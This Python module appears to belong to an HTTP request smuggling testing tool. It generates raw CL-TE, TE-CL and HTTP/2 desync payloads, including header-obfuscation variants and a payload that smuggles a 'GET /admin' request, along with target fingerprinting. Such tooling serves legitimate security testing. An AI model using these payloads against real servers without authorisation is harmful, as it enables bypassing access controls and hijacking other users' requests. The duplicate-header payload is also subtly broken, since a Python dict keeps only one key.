# modules/http_desync/engine/payloads_generator.py
"""
HTTP Desync Attack Tester module for modern security testing.

This module provides comprehensive HTTP Request Smuggling vulnerability detection
with support for HTTP/1.1, HTTP/2, modern payloads, and stealth capabilities.
"""

import httpx
import ssl
import socket
import h2.events
import time
import urllib.parse
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple, Union
from dataclasses import dataclass
from enum import Enum

from rich.console import Console

try:
    from core.randomizer import HeaderFactory
    RANDOMIZER_AVAILABLE = True
except ImportError:
    RANDOMIZER_AVAILABLE = False
    print("Warning: randomizer.py not found. Using basic headers.")

try:
    from core.utils import clear_console
except ImportError:
    def clear_console():
        import os
        os.system('cls' if os.name == 'nt' else 'clear')

# ============================================================================
# DATACLASSES
# ============================================================================

class VulnStatus(Enum):
    VULNERABLE = "🚨"
    POTENTIAL = "🤔"
    SAFE = "🛡️"
    ERROR = "🔥"
    TIMEOUT = "⏰"
    BLOCKED = "BLOCKED"

# Test confidence levels
class ConfidenceLevel(Enum):
    HIGH = "High"
    MEDIUM = "Medium"
    LOW = "Low"
    INFO = "Info" 

# HTTP protocol versions
class ProtocolVersion(Enum):
    HTTP1 = "HTTP/1.1"
    HTTP2 = "HTTP/2"

@dataclass
class TestResult:
    """Data class for storing test results"""
    payload_type: str
    status: str
    confidence: str
    details: str
    response_time: float
    protocol: str
    raw_response: Optional[str] = None

@dataclass
class BaselineResponse:
    """Data class for storing baseline response data"""
    status_code: int
    headers: Dict[str, str]
    body: str
    elapsed: float
    content_length: int
    protocol: str




# ============================================================================
# CORE CLASSES
# ============================================================================

class ModernPayloadGenerator:
    """
    Generates modern HTTP Request Smuggling payloads targeting various
    server configurations and edge cases discovered in recent research.
    """

    def __init__(self, target_host: str, target_port: int):
        self.host = target_host
        self.port = target_port
        self.host_header = f"{target_host}:{target_port}" if target_port not in [80, 443] else target_host

    def generate_classic_payloads(self) -> List[Dict[str, Any]]:
        """Generate classic CL-TE and TE-CL payloads"""
        return [
            {
                "type": "CL-TE Basic",
                "protocol": "HTTP/1.1",
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Content-Length": "6",
                        "Transfer-Encoding": "chunked"
                    },
                    body="0\r\n\r\nG"
                ),
                "description": "Basic CL-TE desync attempt"
            },
            {
                "type": "TE-CL Basic",
                "protocol": "HTTP/1.1",
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Transfer-Encoding": "chunked",
                        "Content-Length": "4"
                    },
                    body="1\r\nA\r\n0\r\n\r\n"
                ),
                "description": "Basic TE-CL desync attempt"
            }
        ]

    def generate_modern_payloads(self) -> List[Dict[str, Any]]:
        """Generate modern payloads targeting recent discoveries"""
        payloads = []

        # CL-TE with various Transfer-Encoding variations
        te_variations = [
            "chunked",
            " chunked",
            "chunked ",
            "\tchunked",
            "chunked\t",
            "chunked\r",
            "chunked\n",
            "x-chunked",
            "chunked, identity"
        ]

        for i, te_val in enumerate(te_variations):
            payloads.append({
                "type": f"CL-TE Variation {i+1}",
                "protocol": "HTTP/1.1",
                "payload": self._build_raw_request(
                    method="POST",
                    path="/",
                    headers={
                        "Host": self.host_header,
                        "Content-Length": "6",
                        "Transfer-Encoding": te_val
                    },
                    body="0\r\n\r\nG"
                ),
                "description": f"CL-TE with TE header: '{te_val}'"
            })

        # Multiple Transfer-Encoding headers
        payloads.append({
            "type": "Multiple TE Headers",
            "protocol": "HTTP/1.1",
            "payload": self._build_raw_request(
                method="POST",
                path="/",
                headers={
                    "Host": self.host_header,
                    "Content-Length": "6",
                    "Transfer-Encoding": "identity",
                    "Transfer-Encoding": "chunked"  # This will create duplicate headers
                },
                body="0\r\n\r\nG"
            ),
            "description": "Multiple Transfer-Encoding headers"
        })

        # CL-TE with request smuggling prefix
        payloads.append({
            "type": "CL-TE Prefix Smuggling",
            "protocol": "HTTP/1.1",
            "payload": self._build_raw_request(
                method="POST",
                path="/",
                headers={
                    "Host": self.host_header,
                    "Content-Length": "51",
                    "Transfer-Encoding": "chunked"
                },
                body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + self.host_header + "\r\n\r\n"
            ),
            "description": "CL-TE attempting to smuggle GET /admin request"
        })

        # HTTP/2 specific payloads
        if self._supports_http2():
            payloads.extend(self.generate_http2_payloads())

        return payloads

    def generate_http2_payloads(self) -> List[Dict[str, Any]]:
        """Generate HTTP/2 specific smuggling payloads"""
        return [
            {
                "type": "HTTP/2 Content-Length Header",
                "protocol": "HTTP/2",
                "payload": {
                    "method": "POST",
                    "path": "/",
                    "headers": [
                        (':authority', self.host_header),
                        (':method', 'POST'),
                        (':path', '/'),
                        (':scheme', 'https'),
                        ('content-length', '0'),  # Forbidden but sometimes processed
                    ],
                    "body": b"",
                    "settings": {
                        "header_table_size": 4096,
                        "enable_push": 0,
                        "max_concurrent_streams": 100,
                        "initial_window_size": 65535,
                        "max_frame_size": 16384,
                        "max_header_list_size": 32768
                    }
                },
                "description": "HTTP/2 request with forbidden Content-Length header"
            },
            {
                "type": "HTTP/2 Request Smuggling via Stream",
                "protocol": "HTTP/2",
                "payload": {
                    "method": "POST",
                    "path": "/",
                    "headers": [
                        (':authority', self.host_header),
                        (':method', 'POST'),
                        (':path', '/'),
                        (':scheme', 'https'),
                    ],
                    "body": b"",
                    "settings": {
                        "header_table_size": 4096,
                        "enable_push": 0,
                        "max_concurrent_streams": 100,
                        "initial_window_size": 65535,
                        "max_frame_size": 16384,
                        "max_header_list_size": 32768
                    },
                    "stream_id": 1,
                    "followed_by": {
                        "stream_id": 1,  # Same stream to cause desync
                        "headers": [
                            (':method', 'GET'),
                            (':path', '/admin'),
                            (':authority', self.host_header),
                            (':scheme', 'https'),
                        ],
                        "body": b""
                    }
                },
                "description": "HTTP/2 stream multiplexing desync attempt"
            },
            {
                "type": "HTTP/2 HPACK Compression Abuse",
                "protocol": "HTTP/2",
                "payload": {
                    "method": "POST",
                    "path": "/",
                    "headers": [
                        (':authority', self.host_header),
                        (':method', 'POST'),
                        (':path', '/'),
                        (':scheme', 'https'),
                        ('x-custom-header', 'a' * 1000),  # Large header to trigger compression issues
                    ],
                    "body": b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + self.host_header.encode() + b"\r\n\r\n",
                    "settings": {
                        "header_table_size": 4096,
                        "enable_push": 0,
                        "max_concurrent_streams": 100,
                        "initial_window_size": 65535,
                        "max_frame_size": 16384,
                        "max_header_list_size": 32768
                    }
                },
                "description": "HTTP/2 HPACK compression smuggling attempt"
            }
        ]
    

    def _build_raw_request(self, method: str, path: str, headers: Dict[str, str], body: str = "") -> bytes:
        """Build a raw HTTP/1.1 request"""
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = ""
        for key, value in headers.items():
            header_lines += f"{key}: {value}\r\n"

        raw_request = f"{request_line}{header_lines}\r\n{body}"
        return raw_request.encode('utf-8')

    def _supports_http2(self) -> bool:
        """Check if target supports HTTP/2"""
        try:
            # Simple ALPN check
            context = ssl.create_default_context()
            context.set_alpn_protocols(['h2', 'http/1.1'])

            with socket.create_connection((self.host, self.port), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.host) as ssock:
                    return ssock.selected_alpn_protocol() == 'h2'
        except Exception:
            return False

# ============================================================================
# TARGET VALIDATION
# ============================================================================

class TargetValidator:
    """
    Validates and confirms test targets before running security tests.
    Ensures targets are reachable and appropriate for testing.
    """

    def __init__(self, console: Console):
        self.console = console

    def validate_target(self, url: str, port: int) -> Tuple[bool, str, Dict[str, Any]]:
        """
        Comprehensive target validation including reachability,
        SSL/TLS configuration, and HTTP version support.

        Returns:
            Tuple of (is_valid, error_message, target_info)
        """
        try:
            parsed_url = urllib.parse.urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                return False, "Invalid URL format", {}

            host = parsed_url.hostname
            if not host:
                return False, "Cannot extract hostname from URL", {}

            # Basic connectivity test
            self.console.print(f"[cyan]Testing connectivity to {host}:{port}...[/cyan]")
            if not self._test_connectivity(host, port):
                return False, f"Cannot connect to {host}:{port}", {}

            # HTTP version detection
            self.console.print("[cyan]Detecting HTTP version support...[/cyan]")
            version_info = self._detect_http_versions(host, port, parsed_url.scheme == 'https')

            # Server fingerprinting
            self.console.print("[cyan]Gathering server information...[/cyan]")
            server_info = self._get_server_info(url, port)

            target_info = {
                "host": host,
                "port": port,
                "scheme": parsed_url.scheme,
                "http_versions": version_info,
                "server_info": server_info
            }

            return True, "", target_info

        except Exception as e:
            return False, f"Validation error: {str(e)}", {}

    def _test_connectivity(self, host: str, port: int, timeout: int = 5) -> bool:
        """Test basic TCP connectivity"""
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except (socket.timeout, ConnectionRefusedError, socket.gaierror):
            return False

    def _detect_http_versions(self, host: str, port: int, use_ssl: bool) -> Dict[str, bool]:
        """Detect supported HTTP versions"""
        versions = {"HTTP/1.1": False, "HTTP/2": False}

        # Test HTTP/1.1
        try:
            with httpx.Client(http2=False, verify=False) as client:
                response = client.get(f"{'https' if use_ssl else 'http'}://{host}:{port}", timeout=10)
                versions["HTTP/1.1"] = True
        except Exception:
            pass

        # Test HTTP/2
        try:
            with httpx.Client(http2=True, verify=False) as client:
                response = client.get(f"{'https' if use_ssl else 'http'}://{host}:{port}", timeout=10)
                if hasattr(response, 'http_version') and response.http_version == "HTTP/2":
                    versions["HTTP/2"] = True
        except Exception:
            pass

        return versions

    def _get_server_info(self, url: str, port: int) -> Dict[str, str]:
        """Gather server information from headers"""
        info = {}
        try:
            with httpx.Client(verify=False, timeout=10) as client:
                response = client.get(f"{url}:{port}")
                info.update({
                    "server": response.headers.get("Server", "Unknown"),
                    "powered_by": response.headers.get("X-Powered-By", "Unknown"),
                    "status_code": response.status_code,
                    "content_type": response.headers.get("Content-Type", "Unknown")
                })
        except Exception as e:
            info["error"] = str(e)

        return info